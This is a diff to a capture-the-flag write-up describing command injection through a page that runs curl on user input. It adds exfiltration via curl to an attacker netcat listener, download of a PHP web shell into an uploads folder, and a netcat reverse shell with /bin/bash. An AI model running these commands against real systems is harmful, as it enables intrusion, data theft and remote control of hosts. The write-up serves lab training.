@@ -90,14 +90,64 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ```
 The page `/exposed.php` has a text input, and when passing a URL it displays on screen the result of curling it. I tried to inject some command but some symbols/keywords were blocked e.g. &, | (pipe), python and nc. Curl flags are not blocked, though.
 
-Checking `curl` man's page for ways to get more information about the system, I thought of sending information through body data. That was enough for getting the user flag.
+Checking `curl` man's page for ways to get more information about the system, I thought of sending information through body data of a curl request sent to a `nc` listener.
 
 Set up listener from attacker: 
 ```
 nc -lvp 4444
 ```
 
-Add the following to the input in /exposed.php: 
+Commands now can be executed like this, and the result of the executed command will be passed as data to the listener:
 ```
-curl $ATTACKERIP:4444 -d `cat /home/maria/Desktop/user`
+curl $ATTACKERIP:4444 -d "`command goes here`"
+```
+
+So, if command is `whoami`, the ouput is `www-data`.
+
+It is possible to get the user flag alread from here by executing this:
+```
+cat /home/maria/Desktop/user"
+```
+
+It may be a good idea to try to get a more steady shell. See what files/folders are present:
+```
+ls -alh
+```
+
+In the listener:
+```
+drwxr-xr-x 3 root     root     4.0K May 19  2017 .
+drwxr-xr-x 3 root     root     4.0K May 16  2017 ..
+-rwxr-xr-x 1 root     root     114K May 15  2017 bounce.jpg
+-rwxr-xr-x 1 root     root     164K May 15  2017 carrie.jpg
+-rwxr-xr-x 1 root     root      921 May 15  2017 exposed.php
+-rwxr-xr-x 1 root     root      141 May 15  2017 hair.html
+-rwxr-xr-x 1 root     root      144 May 15  2017 index.html
+-rwxr-xr-x 1 root     root     133K May 15  2017 sea.jpg
+-rwxr-xr-x 1 root     root      223 May 15  2017 test.html
+drwxr-xr-x 2 www-data www-data 4.0K May 22  2017 uploads
+```
+
+It seems `uploads` may be a good place where to put a web shell. I'm going to use a shell called `Predator.php` I got from here https://github.com/JohnTroony/php-webshells.git:
+```
+cd php-webshells
+python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+```
+
+And now from the input in /exposed.php we get paste shell to uploads folder (now without wrapping it with the trick we used before to execute commands, as we'll leverage curl to get the shell):
+```
+10.10.14.23:8000/Predator.php -o uploads/Predator.php
+```
+
+Now, going to `uploads/Predator.php` the webshell can be accessed.
+
+Set `nc` listener in the attacker to handle the reverse shell:
+```
+nc -lvp 4444
+```
+
+The webshell allows the user to execute in a shell. We hit the handler:
+```
+nc $IP_ATTACKER 4444 -e /bin/bash
 ```
